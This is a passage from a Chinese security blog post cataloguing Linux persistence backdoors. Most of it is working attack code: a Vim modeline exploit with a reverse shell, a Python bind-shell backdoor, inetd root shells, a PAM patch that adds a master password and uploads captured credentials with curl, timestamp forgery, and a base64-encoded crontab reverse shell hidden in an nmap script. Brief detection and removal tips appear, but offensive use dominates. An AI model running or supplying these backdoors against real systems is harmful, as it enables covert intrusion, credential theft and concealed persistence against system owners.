+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd_h &#x3D; &quot;echo &#39;You forgot to check &#96;cat -A&#96;!&#39; &gt; oops&quot; # hidden</span><br><span class="line">cmd_v &#x3D; &quot;echo &#39;Hello world!&#39;&quot;                         # visible</span><br><span class="line"></span><br><span class="line">with open(&quot;test.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">output &#x3D; &quot;#!&#x2F;bin&#x2F;sh\n&quot;</span><br><span class="line">output +&#x3D; cmd_h + &quot;;&quot; + cmd_v + &quot; #\r&quot; + cmd_v + &quot; &quot; * (len(cmd_h) + 3) + &quot;\n&quot;</span><br><span class="line">f.write(output)</span><br></pre></td></tr></table></figure>
+<p>使用 py 生成了一个 test.sh 脚本，同目录下只有他本文件，cat查看一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6c2fc96f653ae7645649928fe1d64926384.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6c2fc96f653ae7645649928fe1d64926384.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1f39081a91de5f4295e4179a0c50ed03440.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1f39081a91de5f4295e4179a0c50ed03440.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/feb10e961edcbad0e911dc94c130a973808.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/feb10e961edcbad0e911dc94c130a973808.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p>其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前 Cron 后门中的隐藏方法就是利用了这个。如果使用 cat -A 查看root文件的话就可以看到计划任务的真正内容了。</p>
+<h3 id="Vim后门"><a href="#Vim后门" class="headerlink" title="Vim后门"></a>Vim后门</h3><h4 id="1-vim-modeline-CVE-2019-12735"><a href="#1-vim-modeline-CVE-2019-12735" class="headerlink" title="1. vim modeline(CVE-2019-12735)"></a>1. vim modeline(CVE-2019-12735)</h4><p>该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当 vim  打开一个包含了 vim modeline 注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。</p>
+<p>开启命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.vimrc</span><br><span class="line">set modeline</span><br></pre></td></tr></table></figure>
+<p>当前目录下创建文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;&#39; &gt; hello.txt</span><br><span class="line">vim hello.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2f8b80a7e444680e8a5d12a8a164d9bc917.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2f8b80a7e444680e8a5d12a8a164d9bc917.png" srcset="data:image/png;base64,666" alt="img"></p>
+<p>反弹shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 127.0.0.1 9999 &gt;&#x2F;tmp&#x2F;f||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="2-vim-python-扩展后门"><a href="#2-vim-python-扩展后门" class="headerlink" title="2. vim python 扩展后门"></a>2. vim python 扩展后门</h4><p>适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</span><br></pre></td></tr></table></figure>
+<p>恶意脚本 dir.py 的内容可以是任何功能的后门，比如监听本地的11端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#from https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PYTHON&#x2F;python-shell-backdoor.html</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">       server&#x3D;socket(AF_INET,SOCK_STREAM)</span><br><span class="line">       server.bind((&#39;0.0.0.0&#39;,11))</span><br><span class="line">       server.listen(5)</span><br><span class="line">       print &#39;waiting for connect&#39;</span><br><span class="line">       talk, addr &#x3D; server.accept()</span><br><span class="line">       print &#39;connect from&#39;,addr</span><br><span class="line">       proc &#x3D; subprocess.Popen([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;], stdin&#x3D;talk,</span><br><span class="line">               stdout&#x3D;talk, stderr&#x3D;talk, shell&#x3D;True)</span><br></pre></td></tr></table></figure>
+<p>攻击机nc连接过去就可以了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup vim -E -c &quot;pyfile dir.py&quot;</span><br><span class="line">nc 127.0.0.1 11</span><br></pre></td></tr></table></figure>
+<h3 id="inetd服务后门"><a href="#inetd服务后门" class="headerlink" title="inetd服务后门"></a>inetd服务后门</h3><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#修改&#x2F;etc&#x2F;inetd.conf</span><br><span class="line">$vim &#x2F;etc&#x2F;inetd.conf</span><br><span class="line"></span><br><span class="line">#discard stream tcp nowait root internal </span><br><span class="line">#discard dgram udp wait root internal </span><br><span class="line">daytime stream tcp nowait root &#x2F;bin&#x2F;bash bash -i</span><br><span class="line"></span><br><span class="line">#开启inetd</span><br><span class="line">$inetd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#nc连接</span><br><span class="line">nc -vv 192.168.2.11 13</span><br><span class="line">#可以配合suid后门，修改&#x2F;etc&#x2F;services文件：</span><br><span class="line">suidshell 6666&#x2F;tcp</span><br><span class="line">#然后修改&#x2F;etc&#x2F;inetd.conf</span><br><span class="line">suidshell stream tcp nowait root &#x2F;bin&#x2F;bash bash -i</span><br><span class="line">#可以修改成一些常见的端口，以实现隐藏</span><br></pre></td></tr></table></figure>
+<p>检测：查看配置文件即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;inetd.conf</span><br></pre></td></tr></table></figure>
+<h3 id="协议后门"><a href="#协议后门" class="headerlink" title="协议后门"></a>协议后门</h3><p>在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。</p>
+<h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/41154036">https://zhuanlan.zhihu.com/p/41154036</a></p>
+<p>开源工具：ICMP后门项目地址：<a target="_blank" rel="noopener" href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p>
+<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>在大多数的网络里环境中IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85431">通过DNS传输后门来绕过杀软</a></p>
+<p>开源工具：DNS后门项目地址：<a target="_blank" rel="noopener" href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p>
+<p>协议后门检测：对于DNS/ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接</p>
+<p>清除：kill进程、删除文件即可</p>
+<h3 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h3><p>PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security下的模块。</p>
+<p>PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open</p>
+<p>上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。</p>
+<p>利用步骤：复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt;  将生成的pam_uninx.so文件覆盖到/lib/secruity/pam_unix.so下 &gt;&gt;&gt; 修改文件属性  &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志 &gt;&gt;&gt; ok</p>
+<p>1、查看pam版本并下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep pam</span><br><span class="line">pam-1.1.8-12.el7_1.1.x86_64</span><br><span class="line">http:&#x2F;&#x2F;www.linux-pam.org&#x2F;library&#x2F;</span><br><span class="line">curl -O http:&#x2F;&#x2F;www.linux-pam.org&#x2F;library&#x2F;Linux-PAM-1.1.8.tar.gz</span><br></pre></td></tr></table></figure>
+<p>2、修改并编译pam_unix_auth.c文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Linux-PAM-1.1.8</span><br><span class="line">vim modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</span><br></pre></td></tr></table></figure>
+<p>3、pam_unix_auth.c 修改前</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* verify the password of this user *&#x2F;</span><br><span class="line">    retval &#x3D; _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">    name &#x3D; p &#x3D; NULL;</span><br></pre></td></tr></table></figure>
+<p>4、pam_unix_auth.c 修改后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* verify the password of this user *&#x2F;</span><br><span class="line">    retval &#x3D; _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">    if(strcmp(p,&quot;1q2w3e4r&quot;)&#x3D;&#x3D;0)&#123;return PAM_SUCCESS;&#125;</span><br><span class="line">    if(retval &#x3D;&#x3D; PAM_SUCCESS)&#123;</span><br><span class="line">        FILE * fp;</span><br><span class="line">        fp &#x3D; fopen(&quot;&#x2F;bin&#x2F;.sshlog&quot;, &quot;a&quot;);</span><br><span class="line">        fprintf(fp, &quot;%s : %s\n&quot;, name, p);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        system(&quot;curl -H &#39;Max-Downloads: 0&#39; -H &#39;Max-Days: 7&#39; --upload-file &#x2F;bin&#x2F;.sshlog http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sshlog.txt -s -o &#x2F;dev&#x2F;null --connect-timeout 3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    name &#x3D; p &#x3D; NULL;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#39;Max-Downloads: 0&#39; -H &#39;Max-Days: 7&#39; --upload-file &#x2F;bin&#x2F;.sshlog http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sshlog.txt -s -o &#x2F;dev&#x2F;null --connect-timeout 3</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>编译后：modules/pam_unix/.libs/pam_unix.so</p>
+<p>5、备份/替换/修改时间戳</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ll &#x2F;lib64&#x2F;security&#x2F;</span><br><span class="line">-rwxr-xr-x. 1 root root  57688 8月  18 2015 pam_unix.so</span><br><span class="line">-rwxr-xr-x. 1 root root  15384 8月  18 2015 pam_userdb.so</span><br><span class="line">-rwxr-xr-x. 1 root root   7000 8月  18 2015 pam_warn.so</span><br><span class="line">-rwxr-xr-x. 1 root root  11168 8月  18 2015 pam_wheel.so</span><br><span class="line">-rwxr-xr-x. 1 root root  19744 8月  18 2015 pam_xauth.so</span><br><span class="line">cp &#x2F;lib64&#x2F;security&#x2F;pam_unix.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so.bak</span><br><span class="line">cp .&#x2F;pam_unix.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br><span class="line">touch -r &#x2F;lib64&#x2F;security&#x2F;pam_userdb.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br><span class="line">ll &#x2F;lib64&#x2F;security&#x2F;</span><br><span class="line">-rwxr-xr-x. 1 root root 221776 8月  18 2015 pam_unix.so</span><br><span class="line">-rwxr-xr-x. 1 root root  57688 6月  30 23:18 pam_unix.so.bak</span><br><span class="line">-rwxr-xr-x. 1 root root  15384 8月  18 2015 pam_userdb.so</span><br><span class="line">-rwxr-xr-x. 1 root root   7000 8月  18 2015 pam_warn.so</span><br><span class="line">-rwxr-xr-x. 1 root root  11168 8月  18 2015 pam_wheel.so</span><br><span class="line">-rwxr-xr-x. 1 root root  19744 8月  18 2015 pam_xauth.so</span><br></pre></td></tr></table></figure>
+<p>如果selinux是开启的环境，一定要关掉或者设置好上下文pam_unix.so才能正常工作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查看selinux 状态</span><br><span class="line">getenforce</span><br><span class="line">    Enforcing 关闭</span><br><span class="line">    Permissive 开启</span><br><span class="line">临时关闭selinux</span><br><span class="line">setenforce 0</span><br><span class="line">临时开启selinux</span><br><span class="line">setenforce 1</span><br><span class="line">查看selinux上下文：</span><br><span class="line">ls -Z pam_unix.so.bak</span><br><span class="line">设置selinux上下文：</span><br><span class="line">chcon –reference&#x3D;pam_unix.so.bak pam_unix.so</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#确保ssh开启pam支持</span><br><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#自动化脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;litsand&#x2F;shell&#x2F;blob&#x2F;master&#x2F;pam.sh</span><br></pre></td></tr></table></figure>
+<p>检测：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br><span class="line">2、检查pam_unix.so的修改时间</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32位</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64位</span><br></pre></td></tr></table></figure>
+<p>清除：yum reinstall pam</p>
+<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><p>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有  ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace  系统调用允许一个进程去调试另外一个进程。</p>
+<p>GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$.&#x2F;inject [-n process-name] [-p pid] [library-to-inject]</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure>
+<p>清除：kill或者重启对应的进程即可</p>
+<p>还有 cymothoa ：<a target="_blank" rel="noopener" href="https://github.com/jorik041/cymothoa">https://github.com/jorik041/cymothoa</a></p>
+<h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h3><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix</p>
+<p>Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件</p>
+<p>检测：使用相关检测工具，比如：unhide</p>
+<h3 id="nmap-nse后门"><a href="#nmap-nse后门" class="headerlink" title="nmap nse后门"></a>nmap nse后门</h3><p>很多linux系统中默认都安装了nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.nmap/scripts/</span><br><span class="line"><span class="built_in">cd</span> ~/.nmap/scripts/</span><br><span class="line">curl -O <span class="string">&#x27;https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/master/nmap/http-title.nse&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local payload &#x3D; &quot;ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+<p>base64解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;*/1 * * * * python -c &quot;</span>exec(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO2hvc3Q9JzEyNy4wLjAuMSc7cG9ydD00NDM7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KChob3N0LHBvcnQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbJy9iaW4vYmFzaCcsICctaSddKTsK&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="string">&quot;&quot;</span> | crontab<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;host=<span class="string">&#x27;127.0.0.1&#x27;</span>;port=<span class="number">443</span>;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>可以将127.0.0.1改成你的地址</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/>https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>权限维持</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/linux/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>linux</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/&title=Linux 权限维持整理 - cances&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/&title=Linux 权限维持整理 - cances&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/&title=Linux 权限维持整理 - cances&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-telegram" title="" rel="external nofollow noopener noreferrer noopener"
+          
+            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2020/07/20/Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%95%B4%E7%90%86/&text=Linux 权限维持整理 - cances"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/telegram.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/telegram.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/12/26/tsh/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>tsh</p>
+          <p class='content'>介绍下载地址：https://github.com/orangetw/tsh
+功能：
+
+通信加密
+支持上传、下载、直接反弹shell
+
+tsh.h文件，用来配置生成的tsh
+1234567891...</p>
+        </a>
+      
+      
+        <a class='next' href='/2019/04/06/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84-WebShell-%E6%A3%80%E6%B5%8B/'>
+          <p class='title'>基于机器学习的 WebShell 检测<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+当时为了完成毕设写的一个小东西，留作纪念。大佬们看了轻喷
+
+学习网络安安全有段时间了，对Web安全已经建立了一个系统的认识。而且自己一直对人工智能、机器学习这类东西蛮感兴趣的，而且一直在看《H...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="minivaline_container">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
